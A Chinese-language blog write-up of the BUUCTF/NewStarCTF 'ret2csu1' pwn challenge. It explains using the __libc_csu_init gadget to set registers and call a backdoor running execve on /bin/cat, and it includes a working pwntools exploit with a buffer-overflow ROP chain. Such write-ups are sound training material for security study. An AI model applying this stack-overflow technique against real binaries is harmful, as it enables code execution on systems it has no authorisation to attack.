---
title: BUUCTF-NewStarCTF-ret2csu1 题解
date: 2026-01-12 11:10:00
tags: 
    - pwn
    - stack
    - BUUCTF
categories: pwn 题解
---
### 题目

[题目链接](https://buuoj.cn/challenges#[NewStarCTF%20%E5%85%AC%E5%BC%80%E8%B5%9B%E8%B5%9B%E9%81%93]ret2csu1)

### checksec

![这是什么鸭](https://pic.ratherhard.com/post/BUUCTF/NewStarCTF-ret2csu1/checksec.png)

### IDA

![这是什么鸭](https://pic.ratherhard.com/post/BUUCTF/NewStarCTF-ret2csu1/csu.png)

csu 中有 call [r12 + rbx*8] ，令 r12 为指向 backdoor 地址的一个地址即 gift3 ， rbp 为 0 即可调用 backdoor

![这是什么鸭](https://pic.ratherhard.com/post/BUUCTF/NewStarCTF-ret2csu1/gift.png)

![这是什么鸭](https://pic.ratherhard.com/post/BUUCTF/NewStarCTF-ret2csu1/bincat.png)

根据 execve 的参数定义，令 rdi -> "/bin/cat\x00" 即 rdi = aBinCat , rsi = gift2 , rdx = 0 再调用 backdoor 即可

![这是什么鸭](https://pic.ratherhard.com/post/BUUCTF/NewStarCTF-ret2csu1/backdoor.png)

### exp

```python
from pwn import *

context.log_level = 'debug'
context.arch = 'amd64'

io = process('./ret2csu1')

csu1 = p64(0x40072A)
csu2 = p64(0x400710)
rdi = p64(0x4007BB)
rsi = p64(0x601050)
backdoor = p64(0x601068)

padding = 32 + 8

payload = b'A' * padding + csu1 + p64(0) + p64(1) + backdoor + rdi + rsi + p64(0) + csu2

io.recvuntil(b'it!\n')
io.sendline(payload)
io.interactive()
```